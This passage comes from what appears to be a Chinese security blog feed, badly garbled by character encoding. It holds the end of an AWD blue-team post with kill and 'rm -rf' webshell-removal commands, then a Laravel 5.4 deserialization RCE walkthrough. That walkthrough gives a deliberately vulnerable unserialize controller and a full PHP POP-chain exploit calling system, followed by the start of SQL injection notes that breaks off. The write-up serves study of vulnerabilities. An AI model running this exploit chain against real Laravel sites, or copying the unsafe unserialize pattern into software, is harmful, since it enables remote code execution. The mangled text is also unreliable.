â€˜&#123;<span class="built_in">print</span> <span class="variable">$2</span>&#125;â€™ | xargs <span class="built_in">kill</span> -9</span><br></pre></td></tr></table></figure><p>4ã€æ¡ä»¶ç«äº‰</p><p>æ€è¿›ç¨‹åé‡å¯æœåŠ¡ï¼Œå†™ä¸€ä¸ªåŒåçš„æ–‡ä»¶å¤¹å’Œå†™ä¸€ä¸ªsleepæ—¶é—´ä½äºåˆ«äººçš„é©¬(æˆ–è€…å†™ä¸€ä¸ªè„šæœ¬ä¸æ–­åˆ é™¤åˆ«äººçš„é©¬)</p><p>æ¯”å¦‚å†™ä¸ªé©¬æ¥ä¸€ç›´æ€æ­»ä¸æ­»é©¬è¿›ç¨‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;kill -9 pid;rm -rf .shell.php&quot;</span>); <span class="meta">?&gt;</span>  <span class="comment">#pidå’Œä¸æ­»é©¬åç§°æ ¹æ®å®é™…æƒ…å†µå®š</span></span><br></pre></td></tr></table></figure></blockquote><h5 id="åé—¨ç”¨æˆ·æŸ¥æ€ï¼š"><a href="#åé—¨ç”¨æˆ·æŸ¥æ€ï¼š" class="headerlink" title="åé—¨ç”¨æˆ·æŸ¥æ€ï¼š"></a>åé—¨ç”¨æˆ·æŸ¥æ€ï¼š</h5><p>UIDå¤§äº500çš„éƒ½æ˜¯éç³»ç»Ÿè´¦å·ï¼Œ500ä»¥ä¸‹çš„éƒ½ä¸ºç³»ç»Ÿä¿ç•™çš„è´¦å·ï¼Œä½¿ç”¨<code>userdel -r username</code> å®Œå…¨åˆ é™¤è´¦æˆ·</p><h5 id="å…¶ä»–æŸ¥æ€ï¼š"><a href="#å…¶ä»–æŸ¥æ€ï¼š" class="headerlink" title="å…¶ä»–æŸ¥æ€ï¼š"></a>å…¶ä»–æŸ¥æ€ï¼š</h5><p>éƒ¨åˆ†åé—¨è¿‡äºéšè”½ï¼Œå¯ä»¥ä½¿ç”¨<code>ls -al</code>å‘½ä»¤æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶åŠæ–‡ä»¶ä¿®æ”¹æ—¶é—´å’Œå†…å®¹è¿›è¡Œç»¼åˆåˆ¤æ–­ï¼Œè¿›è¡Œåˆ é™¤ã€‚<code>å¯ä»¥å†™è„šæœ¬å®šæ—¶æ¸…ç†ä¸Šä¼ ç›®å½•ã€å®šæ—¶ä»»åŠ¡å’Œä¸´æ—¶ç›®å½•ç­‰</code></p><h5 id="è¿›ç¨‹æŸ¥æ€"><a href="#è¿›ç¨‹æŸ¥æ€" class="headerlink" title="è¿›ç¨‹æŸ¥æ€"></a>è¿›ç¨‹æŸ¥æ€</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -aux  <span class="comment">#æŸ¥çœ‹è¿›ç¨‹</span></span><br><span class="line"><span class="built_in">kill</span> -9 pid <span class="comment">#å¼ºåˆ¶è¿›ç¨‹æŸ¥æ€</span></span><br></pre></td></tr></table></figure><h5 id="å…³é—­ç«¯å£"><a href="#å…³é—­ç«¯å£" class="headerlink" title="å…³é—­ç«¯å£"></a>å…³é—­ç«¯å£</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -anp  <span class="comment">#æŸ¥çœ‹ç«¯å£</span></span><br><span class="line">firewall-cmd --zone= public --remove-port=80/tcp â€“permanent <span class="comment">#å…³é—­ç«¯å£</span></span><br><span class="line">firewall-cmd â€“reload <span class="comment">#é‡è½½é˜²ç«å¢™</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> è“é˜ŸæŠ€èƒ½ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åº”æ€¥å“åº” </tag>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravelæ¡†æ¶æ¼æ´</title>
      <link href="/2024/12/05/laravel-5.4-%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4rce/"/>
      <url>/2024/12/05/laravel-5.4-%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4rce/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="laravel-5-4-åºåˆ—åŒ–å¯¼è‡´rce"><a href="#laravel-5-4-åºåˆ—åŒ–å¯¼è‡´rce" class="headerlink" title="laravel-5.4-åºåˆ—åŒ–å¯¼è‡´rce"></a>laravel-5.4-åºåˆ—åŒ–å¯¼è‡´rce</h1><h2 id="å¤ç°è¿‡ç¨‹"><a href="#å¤ç°è¿‡ç¨‹" class="headerlink" title="å¤ç°è¿‡ç¨‹"></a>å¤ç°è¿‡ç¨‹</h2><p><a href="https://laravelacademy.org/post/2">laravelå®‰è£…åŒ…ä¸‹è½½åœ°å€</a></p><p>æ‰¾aié—®æ€ä¹ˆæ­å»ºLaravelç¯å¢ƒå³å¯</p><p>åœ¨ <code>/routes/web.php</code> æ–‡ä»¶ä¸­æ·»åŠ ä¸€æ¡è·¯ç”±ï¼ŒåŸå…ˆçš„è·¯ç”±æ³¨é‡Š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;\App\Http\Controllers\POPController@test&quot;</span>);</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨<code>/app/Http/Controllers/</code>ä¸‹æ·»åŠ  POPController <a href="https://so.csdn.net/so/search?q=%E6%8E%A7%E5%88%B6%E5%99%A8&spm=1001.2101.3001.7020">æ§åˆ¶å™¨</a>ã€‚<a href="https://marketing.csdn.net/p/3127db09a98e0723b83b2914d9256174?pId=2782&utm_source=glcblog&spm=1001.2101.3001.7020">å‡½æ•°</a>åè¦å’Œè·¯ç”±é‡Œå†™çš„ä¸€æ ·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Http</span>\<span class="title class_">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">POPController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¿é—®é¡µé¢çœ‹åˆ° welcome å³é…ç½®æ­£ç¡®</p><h2 id="å¯»æ‰¾POPé“¾"><a href="#å¯»æ‰¾POPé“¾" class="headerlink" title="å¯»æ‰¾POPé“¾"></a>å¯»æ‰¾POPé“¾</h2><p>ä¸€èˆ¬popé“¾éƒ½æ˜¯ä»<code>__destruct()</code>æˆ–è€…<code>__wakeup()</code>å¼€å§‹</p><p>åœ¨phpstormé‡ŒæŒ‰ä¸¤ä¸‹shiftå¯»æ‰¾</p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202412052007396.png" style="zoom:50%;" /><p>æ‰¾åˆ°åå‘ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;events-&gt;<span class="title function_ invoke__">dispatch</span>(<span class="variable">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‚æ•°eventså’Œeventå¯æ§</p><p>çœ‹åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬åˆ†æå‡ºæœ‰ä¸¤ç§æ€è·¯ï¼Œä¸€ä¸ªæ˜¯å»æ§åˆ¶ä»»æ„ç±»çš„<code>dispatchæ–¹æ³•</code>ï¼Œå¦ä¸€ä¸ªæ˜¯å»å¯»æ‰¾ç±»ä¸­å­˜åœ¨<code>__callæ–¹æ³•</code>å¹¶ä¸”æ²¡æœ‰<code>dispatch()æ–¹æ³•</code>ï¼ˆè¿™æ ·æ‰èƒ½è§¦å‘callæ–¹æ³•ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ï¼Œæ³¨æ„æ˜¯æœ‰å‚æ•°çš„ã€‚ç¬¬ä¸€ä¸ªä¸ºè°ƒç”¨çš„æ–¹æ³•åå­—ï¼Œç¬¬äºŒä¸ªæ˜¯è°ƒç”¨çš„æ–¹æ³•çš„å‚æ•°ã€‚</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆåˆ©ç”¨ç¬¬äºŒç§æ€è·¯ï¼Œå»å¯»æ‰¾__callæ–¹æ³•ï¼Œåœ¨<code>Faker\Generator</code>ç±»ä¸­å‘ç°å¯ä»¥åˆ©ç”¨ã€‚ï¼ˆYiiä¹Ÿæ˜¯ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$attributes</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="variable">$method</span>, <span class="variable">$attributes</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°__callæ–¹æ³•åï¼Œctrl+å·¦é”®è·Ÿè¿›formatï¼ˆï¼‰æ–¹æ³•</p><p>å‘ç°æœ‰ä¸€ä¸ª<code>call_user_func_array()</code>å‡½æ•°ï¼Œå°±æ˜¯æˆ‘ä»¬åˆ©ç”¨çš„åœ°æ–¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array æ˜¯ PHP çš„ä¸€ä¸ªå†…å»ºå‡½æ•°ï¼Œç”¨äºè°ƒç”¨ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œå¹¶å°†æ•°ç»„ä¸­çš„å‚æ•°ä¼ é€’ç»™è¯¥å›è°ƒå‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°å¸¸ç”¨äºåœ¨ä¸çŸ¥é“å…·ä½“è°ƒç”¨å“ªä¸ªå‡½æ•°æˆ–è€…å‡½æ•°å‚æ•°æ•°é‡ä¸ç¡®å®šçš„æƒ…å†µä¸‹ï¼ŒåŠ¨æ€åœ°è°ƒç”¨å‡½æ•°ã€‚</span><br></pre></td></tr></table></figure><p>å‘ç°<code>call_user_func_array()</code>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>getFormatter()</code>é‡Œé¢çš„è¿”å›å€¼ï¼Œæˆ‘ä»¬è·Ÿè¿›<code>getFormatter()</code>å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202412052009753.png"></p><p>å¯ä»¥å‘ç°<code>$this-&gt;formatters[$formatter]</code>æˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œç„¶åç›´æ¥returnï¼Œåé¢çš„ä»£ç å°±æ²¡å¿…è¦çœ‹äº†</p><p><strong>ç°åœ¨æ¢³ç†ä¸€ä¸‹åˆ©ç”¨é“¾</strong></p><ol><li><p>é¦–å…ˆï¼Œæˆ‘ä»¬åˆ†æåˆ°çš„ä¿¡æ¯æœ‰ï¼Œ<code>PendingBroadcast.php</code>ä¸­<code>__destruct()</code>æ–¹æ³•ä¸­çš„eventså’Œeventå‚æ•°å¯æ§ï¼Œå…¶æ¬¡æ‰¾åˆ°äº†<code>Generator.php</code>ä¸­çš„__call()æ–¹æ³•ä¸å«<code>dispatch()</code>æ–¹æ³•ï¼Œå› æ­¤å¯ä»¥è§¦å‘æˆåŠŸï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥é€šè¿‡callæ–¹æ³•çš„getFormatterç±»ï¼Œæ§åˆ¶<code>$this-&gt;formatters[$formatter]</code>ä¸ºæˆ‘ä»¬æ§åˆ¶çš„å‡½æ•°å¦‚<code>system</code>è€Œå‚æ•°å°±æ˜¯<code>PendingBroadcast</code>ç±»çš„<code>$this-&gt;event</code>å¦‚<code>whoami</code></p></li><li><p>ä½†æ˜¯PendingBroadcastå’ŒGeneratoråˆ†åˆ«æ˜¯ä¸¤ä¸ªç±»,æˆ‘ä»¬éœ€è¦ä¸€ä¸ªè¿æ¥ä»–ä¿©çš„æ¡¥æ¢ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ§åˆ¶å‚æ•°<code>$this-&gt;events</code>è®©å…¶ç­‰äº<code>new Generator()</code>ï¼Œè¿™æ ·å°±å˜æˆäº†<code>$this-&gt;new Generator()-&gt;dispatch($this-&gt;event);</code>è¿™æ ·Generatorç±»è°ƒç”¨äº†ä¸€ä¸ªå…¶ç±»åœ¨ä¸å­˜åœ¨çš„æ–¹æ³•<code>dispatch()</code>å°±ä¼šè§¦å‘__callæ–¹æ³•ï¼Œè€Œ<code>__call</code>æ–¹æ³•çš„ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯<code>æ–¹æ³•åå­—</code>å’Œ<code>æ–¹æ³•çš„å‚æ•°</code></p></li><li><p>æˆ‘ä»¬å†åˆ†æä¸€ä¸‹å‚æ•°æ˜¯å¦‚ä½•ä¼ é€’çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">é¦–å…ˆåˆ©ç”¨ç‚¹æ˜¯$this-&gt;events-&gt;dispatch($this-&gt;event);</span><br><span class="line">æˆ‘ä»¬è¦ä¼ å…¥events=new Generator()ï¼Œäºæ˜¯å°±å˜æˆ</span><br><span class="line">$this-&gt;new Generator()-&gt;dispatch($this-&gt;event);</span><br><span class="line">ä¼šè§¦å‘__callæ–¹æ³•ï¼Œè€Œdispatchæ–¹æ³•åå’Œ$this-&gt;eventä¼šä½œä¸ºå‚æ•°ä¼ å…¥__callæ–¹æ³•</span><br><span class="line">æ­¤æ—¶__callæ–¹æ³•return $this-&gt;format(&#x27;â€˜&#x27;dispatch&#x27;, $this-&gt;event);ä¼ å…¥formatæ–¹æ³•</span><br><span class="line">æ­¤æ—¶formatæ–¹æ³•è¿”å›å€¼æ˜¯return call_user_func_array($this-&gt;getFormatter(&#x27;dispatch&#x27;), $this-&gt;event);</span><br><span class="line">è€Œä¼ å…¥getFormatteræ–¹æ³•è¿”å›çš„æ˜¯return $this-&gt;formatters[&#x27;dispatch&#x27;];</span><br><span class="line">å› ä¸ºformatterså‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå€˜è‹¥æˆ‘æŠŠformattersé”®ï¼ˆdispatchï¼‰çš„å€¼æ”¹ä¸ºä¸€ä¸ªæ¶æ„å‡½æ•°å¦‚systemæ˜¯ä¸æ˜¯å°±å¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œäº†</span><br><span class="line">æ­¤æ—¶call_user_func_array()å‡½æ•°ä¼šæŠŠè¿”å›çš„systemå½“ä½œä¸€ä¸ªå›è°ƒå‡½æ•°(å°±æ˜¯å‡½æ•°å˜æˆå‚æ•°ä¼ é€’)</span><br><span class="line">äºæ˜¯call_user_func_array(&#x27;system&#x27;,&#x27;whoami&#x27;);å°±å¯ä»¥æˆåŠŸå‘½ä»¤æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œä¸€æ¡POPé“¾çš„é€»è¾‘å°±æ­¤æ„æˆ</p></li></ol><p>æˆ‘ä»¬ç¼–å†™EXP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingBroadcast</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> <span class="title class_">function</span> <span class="title class_">__construct</span>($<span class="title class_">events</span>, $<span class="title class_">event</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $<span class="title class_">this</span>-&gt;<span class="title class_">event</span> = $<span class="title class_">event</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Generator</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">formatters</span> = <span class="title class_">array</span>();</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$fun</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; formatters = [<span class="string">&quot;dispatch&quot;</span> =&gt; <span class="variable">$fun</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">a</span> = <span class="title class_">new</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>(&quot;<span class="title class_">system</span>&quot;);</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$a</span>,<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡ä¸çŸ¥é“ä»€ä¹ˆåŸå› æ²¡æœ‰æ‰“é€š</p><p>ç»™å¼ å›¾å§<img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202412052009106.png"></p><p>æ‰“å®Œå·®ä¸å¤šå°±æ˜¯è¿™æ ·</p>]]></content>
      
      
      <categories>
          
          <category> ååºåˆ—åŒ– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHPååºåˆ—åŒ– </tag>
            
            <tag> æ¡†æ¶æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ³¨å…¥ä¹‹(äºŒ)</title>
      <link href="/2024/10/22/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F(%E4%BA%8C)/"/>
      <url>/2024/10/22/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="SQLæ³¨å…¥â€”â€”å‡ ç§å¸¸è§çš„æ³¨å…¥æ–¹å¼-äºŒ"><a href="#SQLæ³¨å…¥â€”â€”å‡ ç§å¸¸è§çš„æ³¨å…¥æ–¹å¼-äºŒ" class="headerlink" title="SQLæ³¨å…¥â€”â€”å‡ ç§å¸¸è§çš„æ³¨å…¥æ–¹å¼(äºŒ)"></a>SQLæ³¨å…¥â€”â€”å‡ ç§å¸¸è§çš„æ³¨å…¥æ–¹å¼(äºŒ)</h1><blockquote><p>å› ä¸ºçŸ¥è¯†çç¢ï¼Œä¸€äº›çŸ¥è¯†æ— æ³•ç³»ç»Ÿçš„ç½—åˆ—èµ·æ¥ï¼Œæ‰€ä»¥å¯¹ä¸€äº›å¸¸è§çš„æ³¨å…¥æ–¹å¼è¿›è¡Œäº†æ±‡æ€»ã€æ¢³ç†ï¼Œæ¶µç›–äº†å¤§éƒ¨åˆ†çš„å‰ç½®çŸ¥è¯†ï¼Œä½†æ˜¯ç¢çš„çŸ¥è¯†åªèƒ½æ•´ç†æˆè¿™æ ·äº†ï¼Œå‡‘åˆçœ‹å§ğŸ˜‚</p></blockquote><h2 id="æ ¹æ®æ³¨å…¥æ–¹å¼æ¥æ³¨å…¥-1"><a href="#æ ¹æ®æ³¨å…¥æ–¹å¼æ¥æ³¨å…¥-1" class="headerlink" title="æ ¹æ®æ³¨å…¥æ–¹å¼æ¥æ³¨å…¥(1)"></a>æ ¹æ®æ³¨å…¥æ–¹å¼æ¥æ³¨å…¥(1)</h2><h3 id="1-GETæ³¨å…¥"><a href="#1-GETæ³¨å…¥" class="headerlink" title="1. GETæ³¨å…¥"></a>1. GETæ³¨å…¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ³¨!:ä½¿ç”¨Getæ–¹å¼ä¼ å‚æ—¶,å¯¹äºå®¢æˆ·ç«¯,#ä¼šè¢«å½“åšå‘½ä»¤æ‰§è¡Œè€Œä¸æ˜¯ç›´æ¥è§£æ,åŒæ—¶ç©ºæ ¼ä¹Ÿä¼šè¢«å¿½ç•¥æ‰,ä½†å¯¹äºæœåŠ¡ç«¯æ²¡æœ‰å½±å“,å› æ­¤å°½é‡ä½¿ç”¨--+å·,åœ¨ä½¿ç”¨getæ–¹æ³•sqlæ³¨å…¥æ—¶</span><br></pre></td></tr></table></figure><hr><h3 id="2-POSTæ³¨å…¥"><a href="#2-POSTæ³¨å…¥" class="headerlink" title="2. POSTæ³¨å…¥"></a>2. POSTæ³¨å…¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨è¿›è¡Œpostæ³¨å…¥æ—¶,å¯ä»¥ä½¿ç”¨#å’Œ--ç©ºæ ¼,è€Œä½¿ç”¨--+å°†æ— æ³•è§£æä¸ºæ³¨é‡Š</span><br></pre></td></tr></table></figure><hr><h3 id="3-cookieæ³¨å…¥"><a href="#3-cookieæ³¨å…¥" class="headerlink" title="3. cookieæ³¨å…¥"></a>3. cookieæ³¨å…¥</h3><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410221623857.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å½“ç¬¬ä¸€æ¬¡è®¿é—®ç½‘é¡µæ˜¯ä¸ä¼šå‘é€cookie,ç¬¬äºŒæ¬¡è®¿é—®å´ä¼š,cookieæ›´åƒä½ è®¿é—®ç½‘ç«™çš„å†å²è®°å½•,è®°å½•ç€ä½ çš„å„ç§ä¿¡æ¯(å¦‚å–œå¥½,è´¦å·å¯†ç ...ç­‰)</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°æ³¨å…¥ç‚¹</p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410221626942.png"></p><p>ä¾‹å¦‚<strong>sqli-labsçš„less20</strong></p><p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410221629853.png"></p><hr><h3 id="4-httpå¤´æ³¨å…¥"><a href="#4-httpå¤´æ³¨å…¥" class="headerlink" title="4. httpå¤´æ³¨å…¥"></a>4. httpå¤´æ³¨å…¥</h3><p>å¦‚<code>UA</code>å¤´æ³¨å…¥(user-agent)</p><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410221633598.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/FECES-SHIT/pic-bed@main/202410221633179.png" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨xpath_stringå‡½æ•°æŠ¥é”™ä»è€Œè·å¾—ä¿¡æ¯;åé¢çš„or &#x27;1&#x27;=&#x27;1æ˜¯ç”¨æ¥é—­åˆuser-agentåçš„å•å¼•å·çš„</span><br></pre></td></tr></table></figure><h2 id="æ ¹æ®æ³¨å…¥æ–¹å¼æ¥æ³¨å…¥-2"><a href="#æ ¹æ®æ³¨å…¥æ–¹å¼æ¥æ³¨å…¥-2" class="headerlink" title="æ ¹æ®æ³¨å…¥æ–¹å¼æ¥æ³¨å…¥(2)"></a>æ ¹æ®æ³¨å…¥æ–¹å¼æ¥æ³¨å…¥(2)</h2><hr><h3 id="è”åˆæŸ¥è¯¢"><a href="#è”åˆæŸ¥è¯¢" class="headerlink" title="è”åˆæŸ¥è¯¢"></a>è”åˆæŸ¥è¯¢</h3><p>è”åˆæŸ¥è¯¢æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„å‡½æ•°ï¼Œåœ¨å¾ˆå¤šæ¯”èµ›é‡Œéƒ½ä¼šè¢«banæ‰ï¼Œå› æ­¤æˆ‘ä»¬åœ¨è¿™é‡Œç®€å•äº†è§£ä¸‹å³å¯</p><h4 id="ç›¸å…³è¯­æ³•çŸ¥è¯†"><a href="#ç›¸å…³è¯­æ³•çŸ¥è¯†" class="headerlink" title="ç›¸å…³è¯­æ³•çŸ¥è¯†"></a>ç›¸å…³è¯­æ³•çŸ¥è¯†</h4><ul><li><code>UNION</code>å¯ä»¥å°†å‰åä¸¤ä¸ªæŸ¥è¯¢ç»“æœæ‹¼æ¥åˆ°ä¸€èµ·ï¼Œå¹¶ä¸”è‡ªåŠ¨å»é‡</li><li><code>UNION ALL</code>åŠŸèƒ½ç›¸åŒï¼Œä½†æ˜¯ä¼šæ˜¾ç¤ºæ‰€æœ‰æ•°æ®ï¼Œä¸ä¼šå»é‡</li></ul><p>æœ‰ç±»ä¼¼åŠŸèƒ½çš„è¿˜æœ‰<code>JION</code>ä½†ä»–æ˜¯å¯¹åº“è¡¨è¿›è¡Œè¿æ¥æ“ä½œçš„è¯­å¥ï¼Œæˆ‘ä»¬å…ˆåœ¨å‰é¢ç®€å•æåŠï¼Œåé¢çš„<strong>ç»•è¿‡</strong>ä¸­æˆ‘ä»¬ä¼šè¯¦ç»†è®²è§£ç›¸å…³æ“ä½œ</p><h4 id="æ³¨å…¥æµç¨‹"><a href="#æ³¨å…¥æµç¨‹" class="headerlink" title="æ³¨å…¥æµç¨‹"></a>æ³¨å…¥æµç¨‹</h4><ol><li><p>åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹ï¼Œé—­åˆæƒ…å†µï¼Œç»•è¿‡æ–¹å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 